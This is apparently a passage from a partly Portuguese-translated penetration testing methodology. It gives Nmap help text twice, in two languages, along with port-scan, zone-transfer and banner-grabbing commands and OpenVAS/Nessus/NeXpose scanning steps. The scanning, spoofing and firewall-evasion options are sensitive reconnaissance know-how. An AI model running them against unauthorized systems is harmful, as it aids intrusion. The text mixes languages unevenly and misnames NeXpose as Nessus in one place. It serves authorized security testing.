`  `--port-ratio <ratio>: Verifica portas mais comuns que <ratio> 

DETECÇÃO DE SERVIÇO/VERSÃO: 

`  `-sV: Sonda portas abertas para determinar informações de serviço/versão 

`  `--version-intensity <nível >: Defina de 0 (leve) a 9 (tente todas as sondas) 

`  `--version-light: Limite às sondagens mais prováveis ​​(intensidade 2) 

`  `--version-all: experimente todas as sondagens (intensidade 9) 

`  `--version-trace: Mostrar atividade detalhada de verificação de versão (para depuração) 

SCRIPT SCAN: 

`  `-sC: equivalente a --script=default 

`  `--script=<Lua scripts>: <Lua scripts> é uma lista separada por vírgulas de 

`           `diretórios, arquivos de script ou categorias de script 

`  `--script-args=<n1=v1,[n2=v2,...]>: fornece argumentos para scripts 

`  `--script-trace:

`  `--script-updatedb: Atualize o banco de dados de scripts. 

DETECÇÃO DE SO: 

`  `-O: Ativa a detecção de SO 

`  `--osscan-limit: Limita a detecção de SO a alvos promissores 

`  `--osscan-guess: Adivinha o SO de forma mais agressiva 

TEMPO E DESEMPENHO: 

`  `Opções que levam <tempo> estão em segundos ou acrescentam 'ms' (milissegundos), 

`  `'s' (segundos), 'm' (minutos) ou 'h' (horas) para o valor (por exemplo, 30m). 

`  `-T<0-5>: Definir modelo de tempo (quanto maior, mais rápido) 

`  `--min-hostgroup/max-hostgroup <size>: Tamanhos de grupos de varredura de host paralelo 

`  `--min-parallelism/max-parallelism <numprobes>: Paralelização de sonda 

`  `- -min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: especifica 

`      `o tempo de ida e volta da sonda. 

`  `--max-retries <tries>: Limita o número de retransmissões de sondagem de varredura de porta. 

`  `--host-timeout <tempo>: Desistir do alvo após esse longo período 

`  `--scan-delay/--max-scan-delay <tempo>: Ajustar o atraso entre as sondagens 

`  `--min-rate <número>: Enviar pacotes não mais devagar que <número> por segundo 

`  `--max-rate <número>: Envia pacotes não mais rápido que <número> por segundo 

EVASÃO E SPOOFING DE FIREWALL/IDS: 

`  `-f; --mtu <val>: pacotes fragmentados (opcionalmente com MTU fornecido) 

`  `-D <decoy1,decoy2[,ME],...>: oculta uma varredura com iscas 

`  `-S <IP\_Address>: endereço de origem falsificado 

`  `-e <iface >: Use a interface especificada 

`  `-g/--source-port <portnum>: Use o número da porta fornecido 

`  `--data-length <num>: Anexar dados aleatórios aos pacotes enviados 

`  `--ip-options <options>: Enviar pacotes com ip especificado opções 

`  `--ttl <val>: Definir campo de tempo de vida do IP 

`  `--spoof-mac <endereço mac/prefixo/nome do fornecedor>: falsificar seu endereço MAC 

`  `--badsum: enviar pacotes com uma soma de verificação TCP/UDP/SCTP falsa 

SAÍDA: 

`  `-oN/-oX/-oS/-oG <arquivo>: Varredura de saída nos formatos normal, XML, s|<rIpt kIddi3 

`     `e Grepable, respectivamente, para o nome de arquivo fornecido. 

`  `-oA <basename>: Saída nos três formatos principais de uma vez 

`  `-v: Aumenta o nível de verbosidade (use -vv ou mais para maior efeito) 

`  `-d: Aumenta o nível de depuração (use -dd ou mais para maior efeito) 

`  `--reason: Exibir o motivo pelo qual uma porta está em um estado específico 

`  `--open: Mostrar apenas portas abertas (ou possivelmente abertas) 

`  `--packet-trace: Mostrar todos os pacotes enviados e recebidos 

`  `--iflist: Imprimir interfaces e rotas de host (para depuração) 

`  `-- log-errors: Registra erros/avisos no arquivo de saída de formato normal 

`  `--append-output: Anexar em vez de bloquear arquivos de saída especificados 

`  `--resume <nome do arquivo>:

`  `--webxml: Folha de estilo de referência do Nmap.Org para XML mais portátil 

`  `--no-stylesheet: Impedir a associação de folha de estilo XSL com saída XML 

MISC: 

`  `-6: Habilitar varredura IPv6 

`  `-A: Habilitar detecção de sistema operacional, detecção de versão, varredura de script, e traceroute 

`  `--datadir <dirname>: Especifique a localização do arquivo de dados Nmap personalizado 

`  `--send-eth/--send-ip: Envie usando quadros Ethernet brutos ou pacotes IP 

`  `--privileged: Suponha que o usuário seja totalmente privilegiado 

`  `--unprivileged: Suponha que o usuário não tenha privilégios de soquete brutos 

`  `-V: Imprima o número da versão 

`  `-h: Imprima esta página de resumo de ajuda. 

EXEMPLOS: 

`  `nmap -v -A scanme.nmap.org 

`  `nmap -v -sn 192.168.0.0/16 10.0.0.0/8 

`  `nmap -v -iR 10000 -Pn -p 80 

VEJA A PÁGINA DE MAN (http://nmap.org /book/man.html) PARA MAIS OPÇÕES E EXEMPLOS

O Nmap tem dezenas de opções disponíveis. Como esta seção trata da varredura de portas, nos concentraremos nos comandos necessários para executar esta tarefa. É importante observar que os comandos utilizados dependem principalmente do tempo e do número de hosts que estão sendo verificados. Quanto mais hosts ou menos tempo você tiver para realizar essas tarefas, menos interrogaremos o host. Isto ficará evidente à medida que continuarmos a discutir as opções. 

Para realizar uma varredura de ping, você deve utilizar o seguinte comando:

nmap -sn <intervalo de IP do cliente>/<CIDR> ou <Máscara>

nmap -sn 10.25.0.0/24 

Iniciando o Nmap 5.51 ( http://nmap.org ) em 22/04/2011 22:58 Eastern Daylight Time 

Relatório de varredura do Nmap para 10.25.0.1 

O host está ativo (latência de 0,0030s). 

Endereço MAC: C0:C1:C0:09:5C:16 (Desconhecido) 

Relatório de varredura Nmap para 10.25.0.111 

O host está ativo (latência de 0,013s). 

Endereço MAC: A8:E3:EE:97:3D:46 (Sony Computer Entertainment) 

Relatório de varredura Nmap para 10.25.0.113 

O host está ativo. 

Relatório de varredura Nmap para 10.25.0.119 

O host está ativo (latência de 0,018s). 

Endereço MAC: 00:14:6C:B4:3A:93 (Netgear) 

Nmap concluído: 256 endereços IP (4 hosts ativos) verificados em 6,19 segundos
###### **Vivo6 (Linux)**
Alive6, que faz parte do THC IPv6 Attack Toolkit, oferece o mecanismo mais eficaz para detectar todos os sistemas IPv6. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_39.png "Arquivo:Execução de teste de penetração 39.png")

Alive6 oferece inúmeras opções, mas pode ser executado simplesmente especificando a interface. Isso retorna todos os sistemas IPv6 que estão ativos no link local. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_40.png "Arquivo:Execução de teste de penetração 40.png")
##### **Varredura de porta**
###### **Nmap (Windows/Linux)**
Nmap ("Network Mapper") é o padrão de fato para auditoria/varredura de rede. O Nmap roda em Linux e Windows. O Nmap está disponível nas versões de linha de comando e GUI. Para fins deste documento, cobriremos apenas a linha de comando. 

Nmap 5.51 ( http://nmap.org )

Usage: nmap [Scan Type(s)] [Options] {target specification}

TARGET SPECIFICATION:

`  `Can pass hostnames, IP addresses, networks, etc.

`  `Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254

`  `-iL <inputfilename>: Input from list of hosts/networks

`  `-iR <num hosts>: Choose random targets

`  `--exclude <host1[,host2][,host3],...>: Exclude hosts/networks

`  `--excludefile <exclude\_file>: Exclude list from file

HOST DISCOVERY:

`  `-sL: List Scan - simply list targets to scan

`  `-sn: Ping Scan - disable port scan

`  `-Pn: Treat all hosts as online -- skip host discovery

`  `-PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports

`  `-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes

`  `-PO[protocol list]: IP Protocol Ping

`  `-n/-R: Never do DNS resolution/Always resolve [default: sometimes]

`  `--dns-servers <serv1[,serv2],...>: Specify custom DNS servers

`  `--system-dns: Use OS's DNS resolver

`  `--traceroute: Trace hop path to each host

SCAN TECHNIQUES:

`  `-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans

`  `-sU: UDP Scan

`  `-sN/sF/sX: TCP Null, FIN, and Xmas scans

`  `--scanflags <flags>: Customize TCP scan flags

`  `-sI <zombie host[:probeport]>: Idle scan

`  `-sY/sZ: SCTP INIT/COOKIE-ECHO scans

`  `-sO: IP protocol scan

`  `-b <FTP relay host>: FTP bounce scan

PORT SPECIFICATION AND SCAN ORDER:

`  `-p <port ranges>: Only scan specified ports

`    `Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

`  `-F: Fast mode - Scan fewer ports than the default scan

`  `-r: Scan ports consecutively - don't randomize

`  `--top-ports <number>: Scan <number> most common ports

`  `--port-ratio <ratio>: Scan ports more common than <ratio>

SERVICE/VERSION DETECTION:

`  `-sV: Probe open ports to determine service/version info

`  `--version-intensity <level>: Set from 0 (light) to 9 (try all probes)

`  `--version-light: Limit to most likely probes (intensity 2)

`  `--version-all: Try every single probe (intensity 9)

`  `--version-trace: Show detailed version scan activity (for debugging)

SCRIPT SCAN:

`  `-sC: equivalent to --script=default

`  `--script=<Lua scripts>: <Lua scripts> is a comma separated list of

`           `directories, script-files or script-categories

`  `--script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts

`  `--script-trace: Show all data sent and received

`  `--script-updatedb: Update the script database.

OS DETECTION:

`  `-O: Enable OS detection

`  `--osscan-limit: Limit OS detection to promising targets

`  `--osscan-guess: Guess OS more aggressively

TIMING AND PERFORMANCE:

`  `Options which take <time> are in seconds, or append 'ms' (milliseconds),

`  `'s' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).

`  `-T<0-5>: Set timing template (higher is faster)

`  `--min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes

`  `--min-parallelism/max-parallelism <numprobes>: Probe parallelization

`  `--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies

`      `probe round trip time.

`  `--max-retries <tries>: Caps number of port scan probe retransmissions.

`  `--host-timeout <time>: Give up on target after this long

`  `--scan-delay/--max-scan-delay <time>: Adjust delay between probes

`  `--min-rate <number>: Send packets no slower than <number> per second

`  `--max-rate <number>: Send packets no faster than <number> per second

FIREWALL/IDS EVASION AND SPOOFING:

`  `-f; --mtu <val>: fragment packets (optionally w/given MTU)

`  `-D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys

`  `-S <IP\_Address>: Spoof source address

`  `-e <iface>: Use specified interface

`  `-g/--source-port <portnum>: Use given port number

`  `--data-length <num>: Append random data to sent packets

`  `--ip-options <options>: Send packets with specified ip options

`  `--ttl <val>: Set IP time-to-live field

`  `--spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address

`  `--badsum: Send packets with a bogus TCP/UDP/SCTP checksum

OUTPUT:

`  `-oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,

`     `and Grepable format, respectively, to the given filename.

`  `-oA <basename>: Output in the three major formats at once

`  `-v: Increase verbosity level (use -vv or more for greater effect)

`  `-d: Increase debugging level (use -dd or more for greater effect)

`  `--reason: Display the reason a port is in a particular state

`  `--open: Only show open (or possibly open) ports

`  `--packet-trace: Show all packets sent and received

`  `--iflist: Print host interfaces and routes (for debugging)

`  `--log-errors: Log errors/warnings to the normal-format output file

`  `--append-output: Append to rather than clobber specified output files

`  `--resume <filename>: Resume an aborted scan

`  `--stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML

`  `--webxml: Reference stylesheet from Nmap.Org for more portable XML

`  `--no-stylesheet: Prevent associating of XSL stylesheet w/XML output

MISC:

`  `-6: Enable IPv6 scanning

`  `-A: Enable OS detection, version detection, script scanning, and traceroute

`  `--datadir <dirname>: Specify custom Nmap data file location

`  `--send-eth/--send-ip: Send using raw ethernet frames or IP packets

`  `--privileged: Assume that the user is fully privileged

`  `--unprivileged: Assume the user lacks raw socket privileges

`  `-V: Print version number

`  `-h: Print this help summary page.

EXAMPLES:

`  `nmap -v -A scanme.nmap.org

`  `nmap -v -sn 192.168.0.0/16 10.0.0.0/8

`  `nmap -v -iR 10000 -Pn -p 80

SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES

Nmap has dozens of options available. Since this section is dealing with port scanning, we will focus on the commands required to perform this task. It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned. The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host. This will become evident as we continue to discuss the options. 

Based on IP set being assessed, you would want to scan the both TCP and UDP across port range to 1-65535. The command that will be utilized is as follows: 

nmap -A -PN -sU -sS -T2 -v -p 1-65535 <client ip range>/<CIDR> or <Mask> -oA NMap\_FULL\_<client ip range>

nmap -A -PN -sU -sS -T2 -v -p 1-65535 client.com -oA NMap\_FULL\_client

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:27 Eastern Daylight Time

NSE: Loaded 57 scripts for scanning.

Initiating Parallel DNS resolution of 1 host. at 22:27

Completed Parallel DNS resolution of 1 host. at 22:27, 0.10s elapsed

Initiating SYN Stealth Scan at 22:27

Scanning client.com (74.117.116.73) [65535 ports]

Discovered open port 80/tcp on 74.117.116.73

On large IP sets, those greater than 100 IP addresses do not specify a port range. The command that will be utilized is as follows: 

nmap -A -O -PN <client ip range>/<CIDR> or <Mask> -oA NMap\_<client ip range>

nmap -A -O -PN client.com -oA NMap\_client

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:37 Eastern Daylight Time

Nmap scan report for client.com (74.117.116.73)

Host is up (0.13s latency).

rDNS record for 74.117.116.73: 74-117-116-73.parked.com

Not shown: 999 filtered ports

PORT   STATE SERVICE VERSION

80/tcp open  http    Apache httpd 2.2.3 ((CentOS))

| http-robots.txt: 2 disallowed entries

|\_/click.php /ud.php

|\_http-title: client.com

|\_http-methods: No Allow or Public header in OPTIONS response (status code 200)

|\_http-favicon: Parked.com domain parking

Warning: OSScan results may be unreliable because we could not find at least 1 o

pen and 1 closed port

Device type: general purpose

Running (JUST GUESSING): Linux 2.6.X (92%), OpenBSD 4.X (88%), FreeBSD 6.X (88%)

It should be noted that Nmap has limited options for IPv6. These include TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version detection. 

nmap -6 -sT -P0 fe80::80a5:26f2:8db7:5d04%12

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:42 Eastern Daylight Time

Nmap scan report for lancelot (fe80::80a5:26f2:8db7:5d04)

Host is up (1.0s latency).

Not shown: 988 closed ports

PORT      STATE SERVICE

135/tcp   open  msrpc

445/tcp   open  microsoft-ds

554/tcp   open  rtsp

2869/tcp  open  icslap

3389/tcp  open  ms-term-serv

5000/tcp  open  upnp

5001/tcp  open  commplex-link

5002/tcp  open  rfe

5003/tcp  open  filemaker

5004/tcp  open  avt-profile-1

5357/tcp  open  wsdapi

10243/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 287.05 seconds
##### **SNMP Sweeps**
SNMP sweeps are performed too as they offer tons of information about a specific system. The SNMP protocol is a stateless, datagram oriented protocol. Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports. This means that "no response" from a probed IP address can mean either of the following: 

- Machine unreachable
- SNMP server not running
- invalid community string
- the response datagram has not yet arrived
###### **SNMPEnum (Linux)**
SNMPEnum is a perl script that sends SNMP requests to a single host, then waits for the response to come back and logs them. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_45.png "Arquivo:Execução de teste de penetração 45.png")
##### **Metasploit**
Active footprinting can also be performed to a certain extent through Metasploit. Please refer to the [Metasploit Unleashed](http://www.offensive-security.com/metasploit-unleashed/Information_Gathering) course for more information on this subject. 
##### **Zone Transfers**
DNS zone transfer, also known as AXFR, is a type of DNS transaction. It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers. Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR). There are numerous tools available to test the ability to perform a DNS zone transfer. Tools commonly used to perform zone transfers are host, dig and nmap. 
###### **Host**
host  <domain> <DNS server>
###### **Dig**
dig @server domain axfr
##### **SMTP Bounce Back**
SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a (failed) Delivery Status Notification (DSN) message, a Non-Delivery Notification (NDN) or simply a bounce, is an automated electronic mail message from a mail system informing the sender of another message about a delivery problem. This can be used to assist an attacker in fingerprint the SMTP server as SMTP server information, including software and versions, may be included in a bounce message. 
##### **Reverse DNS**
Reverse DNS can be used to obtain valid server names in use within an organizational. There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address. If it does resolve then the results are returned. This is usually performed by testing the server with various IP addresses to see if it returns any results. 
##### **Banner Grabbing**
Banner Grabbing is an enumeration technique used to glean information about computer systems on a network and the services running its open ports. Banner grabbing is used to identify network the version of applications and operating system that the target host are running. 

Banner grabbing is usually performed on Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol (SMTP); ports 80, 21, and 25 respectively. Tools commonly used to perform banner grabbing are Telnet, nmap, netcat and netca6 (IPv6). 
###### **HTTP**
JUNK / HTTP/1.0

HEAD / HTTP/9.3

OPTIONS / HTTP/1.0

HEAD / HTTP/1.0
###### **httprint**
httprint is a web server fingerprinting tool. It relies on web server characteristics to accurately identify web servers, despite the fact that they may have been obfuscated by changing the server banner strings, or by plug-ins such as mod\_security or servermask. httprint can also be used to detect web enabled devices which do not have a server banner string, such as wireless access points, routers, switches, cable modems, etc. httprint uses text signature strings and it is very easy to add signatures to the signature database. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_46.png "Arquivo:Execução de teste de penetração 46.png")
##### **VoIP mapping**
VoIP mapping is where we gather information about the topology, the servers and the clients. The main goal here is to find live hosts, PBX type and version, VoIP servers/gateways, clients (hardware and software) types and versions. The majority of techniques covered here assume a basic understanding of the *Session Initiation Protocol (SIP*). There are several tools available to help us identify and enumerate VoIP enabled devices. SMAP is a tool which is specifically designed to scan for SIP enabled devices by generating SIP requests and awaiting responses. SMAP usage is as follows: 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_47.png "Arquivo:Execução de teste de penetração 47.png")

SIPScan is another scanner for sip enabled devices that can scan a single host or an entire subnet. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_48.png "Arquivo:Execução de teste de penetração 48.png")
###### **Extensions**
Extensions are any client application or device that initiates a SIP connection, such as an IP phone, PC softphone, PC instant messaging client, or mobile device. The goal is to identify valid usernames or extensions of SIP devices. Enumerating extensions is usually a product of the error messages returned using the SIP method: REGISTER, OPTIONS, or INVITE. There are many tools that can be utilized to enumerate SIP devices. A tool that can be used to enumerate extensions is Svwar from the SIPVicious suite. 
###### **Svwar**
Svwar is also a tool from the sipvicious suite allows to enumerate extensions by using a range of extensions or using a dictionary file svwar supports all the of the three extension enumeration methods as mentioned above, the default method for enumeration is REGISTER. Svwar usage is as follows: 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_49.png "Arquivo:Execução de teste de penetração 49.png")
###### **enumIAX**
If you've identified an Asterisk server is in use, you need to utilize a username guessing tool such as enumIAX to enumerate Asterisk Exchange protocol usernames. enumIAX is an Inter Asterisk Exchange version 2 (IAX2) protocol username brute-force enumerator. enumIAX may operate in two distinct modes; Sequential Username Guessing or Dictionary Attack. enumIAX usage is as follows: 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_50.png "Arquivo:Execução de teste de penetração 50.png")
##### **Passive Reconnaissance**
###### **Packet Sniffing**
Performing packet sniffing allows for the collection IP addresses and MAC addresses from systems that have packet traffic in the stream being analyzed. For the most part, packet sniffing is difficult to detect and so this form of recon is essentially passive and quite stealthy. By collecting and analyzing a large number of packets it becomes possible to fingerprint the operating system and the services that are running on a given device. It may also be possible to grab login information, password hashes, and other credentials from the packet stream. Telnet and older versions of SNMP pass credentials in plain text and are easily compromised with sniffing. Packet sniffing can also be useful in determining which servers act as critical infrastructure and therefore are of interest to an attacker. 
## **Vulnerability Analysis**
Vulnerability Analysis is used to identify and evaluate the security risks posed by identified vulnerabilities. Vulnerability analysis work is divided into two areas: Identification and validation. Vulnerability discovery effort is the key component of the Identification phase. Validation is reducing the number of identified vulnerabilities to only those that are actually valid. 
### **Vulnerability Testing**
Vulnerability Testing is divided to include both an Active and Passive method. 
#### **Active**
#### **Automated Tools**
An automated scanner is designed to assess networks, hosts, and associated applications. There are a number of types of automated scanners available today, some focus on particular targets or types of targets. The core purpose of an automated scanner is the enumeration of vulnerabilities present on networks, hosts, and associated applications. 
##### **Network/General Vulnerability Scanners**
##### **Open Vulnerability Assessment System (OpenVAS) (Linux)**
The Open Vulnerability Assessment System (OpenVAS) is a framework of several services and tools offering a comprehensive and powerful vulnerability scanning and vulnerability management solution. OpenVAS is a fork of Nessus that allows free development of a non-proprietary tool. 

Like the earlier versions of Nessus, OpenVAS consists of a Client and Scanner. To start the Scanner, simply run openvassd from the command line. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_51.png "Arquivo:Execução de teste de penetração 51.png")

There are two ways in which you can run the OpenVAS Client, either the GUI or the command line interface. Using the menu you would select on OpenVAS Client. In the console it is "OpenVAS-Client." 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_52.png "Arquivo:Execução de teste de penetração 52.png")

Once the client starts up you will need to connect it to the scanner. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_53.png "Arquivo:Execução de teste de penetração 53.png")

Submit in the supplied user credentials. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_54.png "Arquivo:Execução de teste de penetração 54.png")

If you created a certificate then you supply it as well. You will then be presented with a certificate to accept. Click yes to continue. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_55.png "Arquivo:Execução de teste de penetração 55.png") 
Once you accept the certificate, OpenVAS will initialize and indicate the number of Found and Enabled plugins. This could take a while depending upon the number of plugins that need to be downloaded. Also, you need to ensure that you've added the appropriate /etc/hosts entries for both the IPv4 and IPv6 address. For example: 

127\.0.0.1       localhost

127\.0.0.1       pentest

\# The following lines are desirable for IPv6 capable hosts

::1     ip6-localhost ip6-loopback pentest localhost

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_56.png "Arquivo:Execução de teste de penetração 56.png")

Before scanning anything we need to configure the OpenVAS Scan Options. The General section covers all the general scan options. See Appendix A for the specific settings. To start a new scan, you use the Scan Assistant. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_57.png "Arquivo:Execução de teste de penetração 57.png")

Once the Scan Assistant launches, you'll have to provide some information to create the task. First, you'll need to give the name of the task. This is usually the name of the client or some other name that describes what you're scanning. Once you've completed this, click Forward to continue. 

[Screenshot Here](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_58.png "Arquivo:Execução de teste de penetração 58.png")

Um escopo pode ser visto como uma subtarefa. Ele define uma determinada varredura e o título deve indicar o escopo da varredura, como "Sistemas voltados para a Internet" ou "Varredura agressiva do cliente X". Depois de concluir isso, clique em Avançar para continuar. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_59.png "Arquivo:Execução de teste de penetração 59.png")

Neste ponto, você precisará fornecer as informações de destino. Isso pode ser na forma de nome de host, FQDN, endereço IP, intervalo de rede, CIDR. O único requisito é que sejam separados por vírgulas. Depois de concluir isso, clique em Avançar para continuar. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_60.png "Arquivo:Execução de teste de penetração 60.png")


Finalmente, chegamos ao ponto em que podemos iniciar nossa varredura. Clique em Executar para iniciar a verificação. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_61.png "Arquivo:Execução de teste de penetração 61.png")

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_62.png "Arquivo:Execução de teste de penetração 62.png")

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_63.png "Arquivo:Execução de teste de penetração 63.png")

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_64.png "Arquivo:Execução de teste de penetração 64.png")
##### **Nessus (Windows/Linux)**
Nessus é um programa comercial de digitalização automatizada. Ele foi projetado para detectar vulnerabilidades potenciais nas redes, hosts e aplicativos associados que estão sendo avaliados. O Nessus permite que políticas personalizadas sejam utilizadas para avaliações específicas. Para aplicações não-Web, a política que deve ser utilizada é a política "Only Safe Checks" (Ver Apêndice A). Para aplicações Web, a política que deve ser utilizada é a política "Only Safe Checks (Web)" (Ver Apêndice B). 

Para acessar o Nessus, basta inserir o URL correto em um navegador da web. Se você estiver acessando pelo Pentest Lab use a seguinte URL: https://<IP ADDRESS>:8834. 



[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_65.png "Arquivo:Execução de teste de penetração 65.png") 

As credenciais para acessar isso precisarão ser estabelecidas antes da tentativa de acesso. Depois de fazer login, será apresentada a interface de relatórios. Antes de executar qualquer varredura Nessus, o produto deve ser validado para garantir que foi atualizado corretamente com as assinaturas mais recentes. Este processo normalmente é executado como parte de uma tarefa agendada, mas você pode clicar em “Sobre” que apresentará o Windows que contém dados sobre a instalação.

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_66.png "Arquivo:Execução de teste de penetração 66.png")

O Client Build ID é uma maneira rápida de garantir que o Nessus foi atualizado. O formato é tão simples quanto AAAAMMDD. 201110223 significaria que o scanner foi atualizado pela última vez em 23 de fevereiro de 2011. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_67.png "Arquivo:Execução de teste de penetração 67.png")

Se o scanner tiver sido atualizado na última semana, você poderá realizar verificações com segurança. Se essa data estiver a mais de uma semana, você deverá relatar isso imediatamente e evitar usar o scanner até que o Nessus seja atualizado. 

No Nessus, há quatro guias principais disponíveis: Relatórios, Verificações, Políticas e Usuários. 
[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_68.png "Arquivo:Execução de teste de penetração 68.png") 

Para iniciar uma verificação, utilize a guia Digitalizar. Isso apresentará várias opções adicionais, como Adicionar, Editar, Navegar, Iniciar, Pausar, Parar e Excluir. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_69.png "Arquivo:Execução de teste de penetração 69.png")

Você criará uma nova verificação clicando na opção “Scans” na barra de menu na parte superior e depois clicando no botão “+ Adicionar” à direita. A tela "Adicionar digitalização" será exibida da seguinte forma:
[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_70.png "Arquivo:Execução de teste de penetração 70.png") 

Existem cinco campos a serem inseridos antes de iniciar uma verificação. O campo de nome é definido com o nome que será exibido para identificar a verificação. O campo de tipo permite escolher entre “Executar agora” e “Modelo”. "Run Now" executa a verificação imediatamente após o envio. "Modelo" salva a digitalização como modelo para verificações repetidas. O campo de política é onde a política de varredura é selecionada. Os dois campos finais estão relacionados aos alvos de verificação. Você pode inserir os hosts (um por linha) ou procurar um arquivo de texto contendo todos os hosts de destino. 

Depois que todos esses campos forem preenchidos corretamente, clique em "Iniciar verificação" para iniciar o processo de verificação. 

*Observação:* às vezes, as ferramentas automatizadas podem ser muito agressivas por padrão e precisam ser reduzidas se o cliente for afetado. 

Uma varredura de validação deve ser realizada semanalmente em <IP ADDRESS> usando a política "Validation Scan" (consulte o Apêndice C) para garantir que o Nessus esteja executando as varreduras corretamente. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_71.png "Arquivo:Execução de teste de penetração 71.png") 
Se você realizar uma "Varredura de validação" e não receber resultados semelhantes, deverá relatar isso imediatamente e anular o uso do scanner. 

Assim que a verificação for concluída, ela ficará visível na guia Relatórios. Para abrir os relatórios de verificação, basta clicar duas vezes no arquivo de verificação concluído apropriado. Isso nos fornecerá algumas informações sobre a verificação, bem como os resultados.
[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_72.png "Arquivo:Execução de teste de penetração 72.png") 

Precisamos salvar este relatório para analisarmos. Para fazer isso, clique em “Baixar relatório”. Isto irá apresentar uma nova janela que permite que o formato seja especificado. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_73.png "Arquivo:Execução de teste de penetração 73.png") 

O formato padrão é “.nessus”, porém é necessário baixar os resultados do Nessus em formato HTML. Isso permite que você revise rapidamente as vulnerabilidades. 
##### **NeXpose**
Nessus é um produto comercial de verificação automatizada que fornece gerenciamento de vulnerabilidades, conformidade com políticas e gerenciamento de remediação. Ele foi projetado para detectar vulnerabilidades, bem como conformidade com políticas nas redes, hosts e aplicativos da web associados. 

Para acessar o NeXpose basta inserir o URL correto em um navegador da web. Se você estiver acessando pelo Pentest Lab use a seguinte URL: https://<IP ADDRESS>:3780/login.html. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_74.png "Arquivo:Execução de teste de penetração 74.png")

As credenciais para acessar isso precisarão ser estabelecidas antes da tentativa de acesso. Depois de fazer login, será apresentada a interface do painel. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_75.png "Arquivo:Execução de teste de penetração 75.png") 
Antes de executar qualquer varredura NeXpose, o produto deve ser validado para garantir que foi atualizado corretamente com as assinaturas mais recentes. Este processo normalmente é executado como parte de uma tarefa agendada, mas você pode validar rapidamente se o scanner está atualizado simplesmente visualizando as 'Notícias', que fornecerão um arquivo de log de todas as atualizações do mecanismo de verificação, bem como quaisquer verificações atualizadas. 

[Captura de tela aqui](http://www.pentest-standard.org/index.php/File:Penetration_Testing_Execution_76.png "Arquivo:Execução de teste de penetração 76.png") 
Se o scanner foi atualizado na última semana, você pode realizar verificações com segurança. Se esta data estiver a mais de uma semana, você deve relatar isso imediatamente e anular o uso do scanner até que o NeXpose seja atualizado. 

